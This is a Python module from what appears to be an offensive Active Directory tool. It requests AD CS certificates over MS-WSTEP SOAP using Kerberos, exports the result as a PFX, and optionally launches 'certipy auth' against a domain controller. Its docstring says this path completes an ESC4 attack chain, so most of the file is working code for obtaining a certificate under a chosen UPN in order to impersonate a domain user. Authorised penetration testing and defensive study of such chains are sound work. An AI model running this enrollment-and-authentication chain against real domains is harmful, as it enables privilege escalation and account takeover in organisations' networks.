"""MS-WSTEP ``RequestSecurityToken`` client for AD CS certificate issuance.

See design doc §3.2 (MS-WSTEP: SOAP 1.2 + WS-Trust 1.3 + WS-Addressing +
Kerberos over HTTPS, action
``http://docs.oasis-open.org/ws-sx/ws-trust/200512/RST/Issue``; request
carries a PKCS#10 ``wsse:BinarySecurityToken``; response carries the
issued cert as an X509v3 ``wsse:BinarySecurityToken`` inside
``wst:RequestedSecurityToken``), §4.3 (API shape) and §5 (CLI surface:
``--enroll-ws``, ``--ces-url``, ``--template``, ``--upn``, ``--out``).

The orchestration path (``run_enroll``) chains MS-XCEP → CSR build →
MS-WSTEP → PKCS#12 export, closing the ESC4 attack chain from §6.
"""

from __future__ import annotations

import logging
import uuid
import xml.etree.ElementTree as ET
from base64 import b64decode, b64encode
from pathlib import Path
from typing import Optional

import requests
import urllib3
from cryptography import x509
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import pkcs12

from src.cert_enroll_xcep import (
    DEFAULT_USER_AGENT,
    SOAP_ENV_NS,
    default_cep_url,
    get_policies,
    kerberos_auth,
)
from src.crypto.csr import build_csr

WST_NS = "http://docs.oasis-open.org/ws-sx/ws-trust/200512"
WSSE_NS = "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
WSA_NS = "http://www.w3.org/2005/08/addressing"
AC_NS = "http://schemas.xmlsoap.org/ws/2006/12/authorization"

# Microsoft CES exposes WS-Trust under its own PKI enrollment action URI, not
# the standard OASIS WS-Trust 1.3 Issue action. The design doc §3.2 proposed
# the OASIS form; the lab (Phase E) proved WCF rejects it with "The action
# is invalid" and only accepts the Microsoft action below.
WSTEP_ACTION = "http://schemas.microsoft.com/windows/pki/2009/01/enrollment/RST/wstep"

DEFAULT_CES_PATH_TMPL = "/{ca_name}_CES_Kerberos/service.svc/CES"

_TEMPLATE_PATH = Path(__file__).parent / "templates" / "wstep_rst.xml"


def default_ces_url(remote_name: str, ca_name: str) -> str:
    """Build the default MS-WSTEP endpoint URL from the DC hostname + CA name."""
    return f"https://{remote_name}" + DEFAULT_CES_PATH_TMPL.format(ca_name=ca_name)


def build_rst_request(
    url: str,
    csr_der: bytes,
    template_oid: str,
    msg_id: Optional[str] = None,
) -> str:
    """Render the SOAP envelope for a RequestSecurityToken Issue request."""
    if msg_id is None:
        msg_id = str(uuid.uuid4())
    csr_b64 = b64encode(csr_der).decode("ascii")
    return _TEMPLATE_PATH.read_text(encoding="utf-8").format(
        msg_id=msg_id,
        to_url=url,
        csr_b64=csr_b64,
        template_oid=template_oid,
    )


def request_cert(
    host: str,
    ca_name: Optional[str],
    template_oid: str,
    csr_der: bytes,
    auth,
    verify_ssl: bool = True,
    timeout: float = 60.0,
    user_agent: str = DEFAULT_USER_AGENT,
) -> bytes:
    """Submit the CSR via MS-WSTEP RequestSecurityToken and return the issued cert DER.

    ``ca_name`` is accepted for API symmetry — the CES endpoint URL already
    routes to the matching CA, so it is not embedded in the envelope. It is
    kept in the signature for future renew-id or multi-CA scenarios.
    """
    del ca_name  # reserved for future use
    if not verify_ssl:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    body = build_rst_request(host, csr_der, template_oid)
    headers = {
        "Content-Type": f'application/soap+xml; charset=utf-8; action="{WSTEP_ACTION}"',
        "User-Agent": user_agent,
    }

    logging.debug("MS-WSTEP RST (to %s):\n%s", host, body)

    try:
        resp = requests.post(
            host,
            data=body.encode("utf-8"),
            headers=headers,
            auth=auth,
            verify=verify_ssl,
            timeout=timeout,
        )
    except requests.exceptions.SSLError as exc:
        raise ConnectionError(
            "SSL verification failed. Use --insecure-ssl for lab testing, "
            "or add the Enterprise CA root to the system trust store."
        ) from exc

    logging.debug("MS-WSTEP response status=%s body:\n%s", resp.status_code, resp.text)

    try:
        return parse_rstr_response(resp.content)
    except RuntimeError:
        raise  # SOAP Fault with a clear reason
    except ValueError as parse_exc:
        if resp.status_code >= 400:
            raise requests.HTTPError(
                f"HTTP {resp.status_code}: {resp.text[:400]}"
            ) from parse_exc
        raise


def parse_rstr_response(xml_bytes: bytes) -> bytes:
    """Extract the issued X509v3 certificate (DER) from a RSTR body.

    Raises :class:`RuntimeError` with the SOAP Fault reason if the response
    carries a ``s:Fault``. Raises :class:`ValueError` if the response has no
    ``BinarySecurityToken`` to decode.
    """
    root = ET.fromstring(xml_bytes)

    fault = root.find(f".//{{{SOAP_ENV_NS}}}Fault")
    if fault is not None:
        reason = fault.find(
            f".//{{{SOAP_ENV_NS}}}Reason/{{{SOAP_ENV_NS}}}Text"
        )
        reason_text = (reason.text if reason is not None else "") or "unspecified SOAP fault"
        raise RuntimeError(f"MS-WSTEP SOAP Fault: {reason_text}")

    bst = root.find(
        f".//{{{WST_NS}}}RequestedSecurityToken//{{{WSSE_NS}}}BinarySecurityToken"
    )
    if bst is None or not bst.text or not bst.text.strip():
        raise ValueError(
            "RSTR missing <wsse:BinarySecurityToken> under <wst:RequestedSecurityToken>"
        )
    return b64decode(bst.text.strip())


def run_enroll(
    remote_name: str,
    ces_url: Optional[str],
    cep_url: Optional[str],
    ca_name: Optional[str],
    template_name: Optional[str],
    upn: Optional[str],
    out_path: Optional[str],
    insecure_ssl: bool,
    user_agent: str = DEFAULT_USER_AGENT,
    auth_dc: Optional[str] = None,
) -> None:
    """CLI dispatch for ``--enroll-ws``: XCEP → CSR → WSTEP → PFX.

    Chains :func:`src.cert_enroll_xcep.get_policies` (template OID + CA chain),
    :func:`src.crypto.csr.build_csr`, :func:`request_cert`, and the PKCS#12
    export. Writes the PFX to ``out_path`` with mode 0600 and prints the
    issued cert's subject plus a ``certipy auth`` hint.
    """
    if insecure_ssl:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    if not template_name:
        logging.critical("--enroll-ws requires --template")
        raise SystemExit(1)
    if not upn:
        logging.critical("--enroll-ws requires --upn")
        raise SystemExit(1)
    if not out_path:
        logging.critical("--enroll-ws requires --out")
        raise SystemExit(1)

    final_cep_url = cep_url
    if not final_cep_url:
        if not ca_name:
            logging.critical("--enroll-ws requires --cep-url or --ca (to derive the URL)")
            raise SystemExit(1)
        final_cep_url = default_cep_url(remote_name)

    final_ces_url = ces_url
    if not final_ces_url:
        if not ca_name:
            logging.critical("--enroll-ws requires --ces-url or --ca (to derive the URL)")
            raise SystemExit(1)
        final_ces_url = default_ces_url(remote_name, ca_name)

    try:
        auth = kerberos_auth()
    except RuntimeError as exc:
        logging.critical(str(exc))
        raise SystemExit(1) from exc

    verify = not insecure_ssl

    try:
        policies = get_policies(final_cep_url, auth, verify=verify, user_agent=user_agent)
    except ConnectionError as exc:
        logging.critical(str(exc))
        raise SystemExit(1) from exc

    template = policies.templates.get(template_name)
    if template is None:
        available = ", ".join(sorted(policies.templates)) or "(none)"
        logging.critical(
            "Template '%s' not found via MS-XCEP. Available: %s",
            template_name,
            available,
        )
        raise SystemExit(1)

    ca_cert = None
    if template.cas:
        ca_entry = policies.cas.get(template.cas[0])
        if ca_entry and ca_entry.cert_der:
            ca_cert = x509.load_der_x509_certificate(ca_entry.cert_der)
        else:
            logging.warning(
                "No CA cert in MS-XCEP response for ref %s; PFX will contain the end cert only",
                template.cas[0],
            )

    csr_der, private_key = build_csr(upn, template_name=template_name)

    try:
        cert_der = request_cert(
            final_ces_url,
            ca_name,
            template.oid,
            csr_der,
            auth,
            verify_ssl=verify,
            user_agent=user_agent,
        )
    except ConnectionError as exc:
        logging.critical(str(exc))
        raise SystemExit(1) from exc
    except RuntimeError as exc:
        logging.critical("MS-WSTEP enrollment failed: %s", exc)
        raise SystemExit(1) from exc

    enrolled_cert = x509.load_der_x509_certificate(cert_der)

    friendly_name = upn.split("@", 1)[0] if "@" in upn else upn
    pfx_bytes = pkcs12.serialize_key_and_certificates(
        name=friendly_name.encode("utf-8"),
        key=private_key,
        cert=enrolled_cert,
        cas=[ca_cert] if ca_cert else None,
        encryption_algorithm=serialization.NoEncryption(),
    )

    out = Path(out_path)
    out.write_bytes(pfx_bytes)
    try:
        out.chmod(0o600)
    except OSError:
        pass

    print(f"[+] Certificate enrolled: {out_path}")
    print(f"    subject: {enrolled_cert.subject.rfc4514_string()}")
    print(f"    issuer:  {enrolled_cert.issuer.rfc4514_string()}")
    print(f"    serial:  {hex(enrolled_cert.serial_number)}")
    if not auth_dc:
        print(f"[+] Try: certipy auth -pfx {out_path} -dc-ip <DC_IP>")

    if auth_dc:
        import shutil
        import subprocess
        import tempfile

        certipy_bin = shutil.which("certipy") or shutil.which("certipy-ad")
        if not certipy_bin:
            print("[-] certipy not found in PATH — install python3-certipy or run manually:")
            print(f"    certipy auth -pfx {out} -dc-ip {auth_dc}")
            return

        print(f"[*] Chaining: {certipy_bin} auth -pfx {out} -dc-ip {auth_dc}")
        cmd = [certipy_bin, "auth", "-pfx", str(out), "-dc-ip", auth_dc, "-no-save"]
        with tempfile.TemporaryDirectory(prefix="soapy-authdc-") as workdir:
            try:
                result = subprocess.run(
                    cmd,
                    cwd=workdir,
                    check=False,
                    text=True,
                )
                if result.returncode != 0:
                    print(f"[-] certipy exited with code {result.returncode}")
            except Exception as exc:
                print(f"[-] certipy chain failed: {exc}")
